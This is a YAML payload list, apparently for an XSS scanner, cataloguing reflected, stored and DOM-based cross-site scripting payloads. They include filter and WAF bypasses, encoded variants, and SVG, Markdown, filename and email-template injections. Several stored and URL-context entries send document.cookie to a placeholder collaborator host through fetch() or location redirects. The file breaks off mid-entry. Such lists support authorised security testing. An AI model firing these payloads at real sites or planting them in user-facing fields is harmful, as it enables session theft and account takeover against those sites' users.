defaults:
  vuln_type: xss
  encoding: raw
  source: ensphere

payloads:

  # =============================================================================
  # REFLECTED XSS — HTML Context (Basic)
  # =============================================================================

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<script>alert(1)</script>"
    notes: "Basic script tag injection. Check if reflected unescaped in HTML body."
    tags: [html, script, probe, confirmation]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img src=x onerror=alert(1)>"
    notes: "IMG tag with onerror handler. Bypasses some script tag filters."
    tags: [html, img, onerror, bypass]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<svg onload=alert(1)>"
    notes: "SVG onload handler. Works in most browsers."
    tags: [html, svg, onload]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<svg/onload=alert(1)>"
    notes: "SVG onload without space. Bypasses space-based filters."
    tags: [html, svg, onload, bypass]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<body onload=alert(1)>"
    notes: "Body onload event handler."
    tags: [html, body, onload]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<details open ontoggle=alert(1)>"
    notes: "details/ontoggle — fires immediately with open attribute."
    tags: [html, details, ontoggle]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<marquee onstart=alert(1)>"
    notes: "Marquee onstart event. Legacy element but still works."
    tags: [html, marquee, onstart]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<iframe src=\"javascript:alert(1)\">"
    notes: "iframe with javascript: URI."
    tags: [html, iframe, javascript_uri]

  # =============================================================================
  # REFLECTED XSS — Attribute Context
  # =============================================================================

  - technique: reflected
    injection_surface: query
    string_boundary: double_quote
    evidence_type: content_match
    risk: 2
    payload: "\" onmouseover=\"alert(1)"
    notes: "Break out of double-quoted attribute + event handler."
    tags: [attribute, double_quote, onmouseover]

  - technique: reflected
    injection_surface: query
    string_boundary: single_quote
    evidence_type: content_match
    risk: 2
    payload: "' onmouseover='alert(1)"
    notes: "Break out of single-quoted attribute + event handler."
    tags: [attribute, single_quote, onmouseover]

  - technique: reflected
    injection_surface: query
    string_boundary: double_quote
    evidence_type: content_match
    risk: 2
    payload: "\"><script>alert(1)</script>"
    notes: "Break out of attribute + close tag + script injection."
    tags: [attribute, double_quote, script, breakout]

  - technique: reflected
    injection_surface: query
    string_boundary: double_quote
    evidence_type: content_match
    risk: 2
    payload: "\"><img src=x onerror=alert(1)>"
    notes: "Break out of attribute + img onerror."
    tags: [attribute, double_quote, img, breakout]

  - technique: reflected
    injection_surface: query
    string_boundary: double_quote
    evidence_type: content_match
    risk: 2
    payload: "\" onfocus=\"alert(1)\" autofocus=\""
    notes: "Inject onfocus + autofocus attributes."
    tags: [attribute, double_quote, onfocus, autofocus]

  # =============================================================================
  # REFLECTED XSS — URL Context (href, src, action)
  # =============================================================================

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "javascript:alert(1)"
    notes: "javascript: URI for href/src/action attributes."
    tags: [url_context, javascript_uri]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "javascript:alert(document.domain)"
    notes: "javascript: URI leaking domain — useful for proof."
    tags: [url_context, javascript_uri, domain]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "data:text/html,<script>alert(1)</script>"
    notes: "data: URI with inline HTML/JS."
    tags: [url_context, data_uri]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "javascript:void(document.location='http://COLLAB_DOMAIN/'+document.cookie)"
    placeholders: [COLLAB_DOMAIN]
    notes: "javascript: URI for cookie exfiltration."
    tags: [url_context, javascript_uri, cookie_theft]

  # =============================================================================
  # REFLECTED XSS — Script Context
  # =============================================================================

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "';alert(1)//'"
    notes: "Break out of JS string (single quote) and execute alert."
    tags: [script_context, single_quote, breakout]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "\";alert(1)//\""
    notes: "Break out of JS string (double quote) and execute alert."
    tags: [script_context, double_quote, breakout]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "</script><script>alert(1)</script>"
    notes: "Close existing script tag and open new one."
    tags: [script_context, close_tag, breakout]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "'-alert(1)-'"
    notes: "JS string breakout using subtraction operator."
    tags: [script_context, operator, breakout]

  # Template literal context
  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "${alert(1)}"
    notes: "Template literal interpolation. Works inside backtick strings."
    tags: [script_context, template_literal]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "${document.domain}"
    notes: "Template literal domain extraction."
    tags: [script_context, template_literal, domain]

  # =============================================================================
  # REFLECTED XSS — Event Handler Variants
  # =============================================================================

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<input onfocus=alert(1) autofocus>"
    notes: "Input autofocus + onfocus. Fires immediately."
    tags: [html, input, onfocus, autofocus]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<video src=x onerror=alert(1)>"
    notes: "Video onerror handler."
    tags: [html, video, onerror]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<audio src=x onerror=alert(1)>"
    notes: "Audio onerror handler."
    tags: [html, audio, onerror]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<object data=\"javascript:alert(1)\">"
    notes: "Object tag with javascript: data URI."
    tags: [html, object, javascript_uri]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<select onfocus=alert(1) autofocus>"
    notes: "Select autofocus + onfocus."
    tags: [html, select, onfocus]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<textarea onfocus=alert(1) autofocus>"
    notes: "Textarea autofocus + onfocus."
    tags: [html, textarea, onfocus]

  # =============================================================================
  # REFLECTED XSS — Header / Cookie / Path Injection
  # =============================================================================

  - technique: reflected
    injection_surface: header
    evidence_type: content_match
    risk: 2
    payload: "<script>alert(1)</script>"
    notes: "XSS via HTTP header reflection (Referer, User-Agent, X-Forwarded-For)."
    tags: [html, script, header]

  - technique: reflected
    injection_surface: cookie
    evidence_type: content_match
    risk: 2
    payload: "<script>alert(1)</script>"
    notes: "XSS via cookie value reflection."
    tags: [html, script, cookie]

  - technique: reflected
    injection_surface: path
    evidence_type: content_match
    risk: 2
    payload: "<script>alert(1)</script>"
    notes: "XSS via URL path segment reflection."
    tags: [html, script, path]

  - technique: reflected
    injection_surface: path
    evidence_type: content_match
    risk: 2
    payload: "<img src=x onerror=alert(1)>"
    notes: "IMG onerror via path reflection."
    tags: [html, img, path]

  # =============================================================================
  # REFLECTED XSS — Filter / WAF Bypass
  # =============================================================================

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<ScRiPt>alert(1)</ScRiPt>"
    notes: "Mixed case to bypass case-sensitive filters."
    tags: [bypass, mixed_case]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<scr<script>ipt>alert(1)</scr</script>ipt>"
    notes: "Nested tag bypass. If filter removes <script> once, inner tags reconstruct."
    tags: [bypass, nested]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img src=x onerror=alert`1`>"
    notes: "Template literal backticks instead of parentheses."
    tags: [bypass, template_literal, no_parens]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img src=x onerror=alert&lpar;1&rpar;>"
    notes: "HTML entity encoded parentheses."
    tags: [bypass, html_entity]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
    notes: "SVG animate onbegin — less commonly filtered event."
    tags: [bypass, svg, animate]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<a href=\"javascript:alert(1)\">click</a>"
    notes: "Anchor tag with javascript: href."
    tags: [html, anchor, javascript_uri]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img/src=x/onerror=alert(1)>"
    notes: "Forward slashes instead of spaces. Bypasses space-based filters."
    tags: [bypass, no_space, slash]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img\tsrc=x\tonerror=alert(1)>"
    notes: "Tab characters instead of spaces."
    tags: [bypass, no_space, tab]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<IMG SRC=\"\" onerror=\"alert(String.fromCharCode(88,83,83))\">"
    notes: "String.fromCharCode to avoid literal 'alert' string."
    tags: [bypass, fromcharcode]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<svg onload=alert(1)//>"
    notes: "SVG self-closing with JS comment."
    tags: [html, svg, self_closing]

  - technique: reflected
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img src=x:alert(alt) onerror=eval(src) alt=1>"
    notes: "Indirect eval via src attribute."
    tags: [bypass, eval, indirect]

  # =============================================================================
  # ENCODED VARIANTS
  # =============================================================================

  # HTML entity encoding
  - technique: reflected
    injection_surface: query
    encoding: html_entity
    evidence_type: content_match
    risk: 2
    payload: "&lt;img src=x onerror=alert(1)&gt;"
    notes: "HTML entity encoded. If double-decoded, triggers XSS."
    tags: [html, encoded, html_entity]

  - technique: reflected
    injection_surface: query
    encoding: html_entity
    evidence_type: content_match
    risk: 2
    payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
    notes: "Hex HTML entities. Tests for double decoding."
    tags: [html, encoded, hex_entity]

  # JS escape
  - technique: reflected
    injection_surface: query
    encoding: js_escape
    evidence_type: content_match
    risk: 2
    payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
    notes: "JS hex escape sequences. If interpreted as JS string then inserted into DOM."
    tags: [script_context, encoded, js_hex]

  - technique: reflected
    injection_surface: query
    encoding: js_escape
    evidence_type: content_match
    risk: 2
    payload: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    notes: "JS unicode escape sequences."
    tags: [script_context, encoded, js_unicode]

  # URL-encoded
  - technique: reflected
    injection_surface: query
    encoding: url
    evidence_type: content_match
    risk: 2
    payload: "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    notes: "URL-encoded script tag."
    tags: [html, url_encoded]

  - technique: reflected
    injection_surface: query
    encoding: url
    evidence_type: content_match
    risk: 2
    payload: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    notes: "URL-encoded img onerror."
    tags: [html, url_encoded, img]

  - technique: reflected
    injection_surface: query
    encoding: double_url
    evidence_type: content_match
    risk: 2
    payload: "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
    notes: "Double URL-encoded. Bypasses single-decode WAF."
    tags: [html, double_url_encoded, bypass]

  # =============================================================================
  # STORED XSS — Form / JSON Body
  # =============================================================================

  - technique: stored
    injection_surface: form_body
    evidence_type: content_match
    risk: 3
    payload: "<script>alert(document.domain)</script>"
    notes: "Stored XSS via form submission. Check if payload persists and renders."
    tags: [html, script, stored, form]

  - technique: stored
    injection_surface: form_body
    evidence_type: content_match
    risk: 3
    payload: "<img src=x onerror=alert(document.domain)>"
    notes: "Stored IMG onerror via form submission."
    tags: [html, img, stored, form]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<script>alert(document.domain)</script>"
    notes: "Stored XSS via JSON API (e.g., profile name, comment body)."
    tags: [html, script, stored, json]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<img src=x onerror=alert(document.domain)>"
    notes: "Stored IMG onerror via JSON API."
    tags: [html, img, stored, json]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<svg onload=alert(document.domain)>"
    notes: "Stored SVG onload via JSON API."
    tags: [html, svg, stored, json]

  - technique: stored
    injection_surface: form_body
    evidence_type: content_match
    risk: 3
    payload: "test<script>fetch('http://COLLAB_DOMAIN/'+document.cookie)</script>"
    placeholders: [COLLAB_DOMAIN]
    notes: "Stored XSS with cookie exfiltration via fetch."
    tags: [html, script, stored, cookie_theft]

  # Stored — file upload context
  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>"
    notes: "SVG file upload with onload XSS. Upload as .svg."
    tags: [svg, file_upload, stored]

  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "GIF89a<script>alert(document.domain)</script>"
    notes: "GIF header + script. Upload as image, serve as HTML if content-type wrong."
    tags: [polyglot, gif, file_upload, stored]

  # Stored — Markdown injection
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "![xss](https://example.com \"onmouseover=alert(1)\")"
    notes: "Markdown image with event handler in title attribute. Targets renderers that pass title to HTML unescaped."
    tags: [stored, markdown, img_title]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "[click me](javascript:alert(document.domain))"
    notes: "Markdown link with javascript: URI. Many renderers allow this protocol."
    tags: [stored, markdown, javascript_uri]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "![alt\"onerror=\"alert(1)](x)"
    notes: "Markdown image alt text breakout to inject onerror handler."
    tags: [stored, markdown, alt_breakout]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "[link](data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+)"
    notes: "Markdown link with base64 data URI containing script. Targets renderers that allow data: in href."
    tags: [stored, markdown, data_uri, base64]

  # Stored — Rich text / contenteditable
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<div contenteditable=\"true\" onfocus=\"alert(document.domain)\" tabindex=\"0\">click to edit</div>"
    notes: "Contenteditable div with onfocus. Fires when user interacts with rich text field."
    tags: [stored, richtext, contenteditable]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<p style=\"font-size:0\">x</p><img src=x onerror=alert(document.domain)>"
    notes: "Rich text editor bypass: hidden paragraph followed by img onerror. Sanitizers may miss the img after block elements."
    tags: [stored, richtext, sanitizer_bypass]

  # Stored — SVG animation
  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\"><set attributeName=\"onmouseover\" to=\"alert(document.domain)\"/></svg>"
    notes: "SVG set element to inject event handler via animation. Fires on hover."
    tags: [stored, svg, animation, set]

  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate onbegin=\"alert(document.domain)\" attributeName=\"x\" dur=\"1s\"/></svg>"
    notes: "SVG animate onbegin fires when animation starts."
    tags: [stored, svg, animation, animate]

  # Stored — Profile / display name injection
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "User<img src=x onerror=alert(document.domain)>"
    notes: "Username / display name field injection. Renders wherever the name is displayed."
    tags: [stored, profile, username]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "About me<script>alert(document.domain)</script>"
    notes: "Bio / about field stored XSS. Bio fields often render richer HTML."
    tags: [stored, profile, bio]

  # Stored — Comment / review
  - technique: stored
    injection_surface: form_body
    evidence_type: content_match
    risk: 3
    payload: "Great product!<details open ontoggle=alert(document.domain)><summary>review</summary></details>"
    notes: "Comment/review stored XSS using details/ontoggle. Less likely to be filtered than script tags."
    tags: [stored, comment, details]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<a href=\"\" onclick=\"alert(document.domain)\">See more</a>"
    notes: "Stored anchor onclick in comments/reviews. Fires on user click."
    tags: [stored, comment, anchor, onclick]

  # Stored — Email / notification template injection
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<img src=\"http://COLLAB_DOMAIN/pixel.gif\" style=\"display:none\">"
    placeholders: [COLLAB_DOMAIN]
    notes: "Email template pixel tracking via stored field. Confirms HTML rendering in email context."
    tags: [stored, email, tracking, probe]

  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<table background=\"javascript:alert(document.domain)\">"
    notes: "Email template XSS via table background attribute. Works in some email clients."
    tags: [stored, email, table, legacy]

  # Stored — Filename XSS
  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "\"><img src=x onerror=alert(document.domain)>.png"
    notes: "XSS via uploaded filename. If filename reflected in download page or file listing without escaping."
    tags: [stored, filename, file_upload, breakout]

  # Stored — HTML file upload
  - technique: stored
    injection_surface: file_upload
    evidence_type: content_match
    risk: 3
    payload: "<html><body><script>alert(document.domain)</script></body></html>"
    notes: "Upload HTML file directly. If served from same origin without Content-Disposition: attachment."
    tags: [stored, html_file, file_upload, same_origin]

  # Stored — JSON field nested HTML
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "<iframe srcdoc=\"<script>alert(document.domain)</script>\">"
    notes: "iframe srcdoc attribute containing inline HTML with script. srcdoc runs in same origin context."
    tags: [stored, iframe, srcdoc]

  # Stored — Webhook / callback URL field
  - technique: stored
    injection_surface: json_body
    evidence_type: content_match
    risk: 3
    payload: "javascript:alert(document.domain)"
    notes: "Stored javascript: URI in URL-type fields (webhook, callback, redirect). Triggers if field rendered as clickable link."
    tags: [stored, webhook_url, javascript_uri]

  # =============================================================================
  # DOM-BASED XSS
  # =============================================================================

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "#<img src=x onerror=alert(1)>"
    notes: "DOM XSS via URL hash fragment. Check if location.hash used in innerHTML."
    tags: [dom, hash, img]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "javascript:alert(1)"
    notes: "DOM XSS via location assignment. Check if query params set window.location."
    tags: [dom, location, javascript_uri]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "\"><img src=x onerror=alert(1)>"
    notes: "DOM XSS via innerHTML with attribute breakout."
    tags: [dom, innerhtml, breakout]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<img src=x onerror=alert(document.domain)>"
    notes: "DOM XSS probe with domain exfil for proof."
    tags: [dom, img, domain]

  # DOM — document.write() sink
  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "<script>alert(1)</script>"
    notes: "DOM XSS via document.write() sink. Check if query param value flows to document.write()."
    tags: [dom, document_write, script]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "\"></title><script>alert(1)</script>"
    notes: "document.write() into title context. Breaks out of title tag first."
    tags: [dom, document_write, title_breakout]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "');alert(1)//'"
    notes: "document.write() injecting into JS string context within the written content."
    tags: [dom, document_write, js_string]

  # DOM — eval / setTimeout / setInterval sinks
  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "1;alert(1)"
    notes: "DOM XSS via eval() sink. Append statement to evaluated expression."
    tags: [dom, eval, semicolon]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: "alert(document.domain)"
    notes: "DOM XSS via setTimeout()/setInterval() with string argument from user input."
    tags: [dom, settimeout, string_arg]

  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
    payload: ");alert(1)//"
    notes: "DOM XSS breaking out of function call passed to eval/setTimeout."
    tags: [dom, eval, function_breakout]

  # DOM — window.name
  - technique: dom
    injection_surface: query
    evidence_type: content_match
    risk: 2
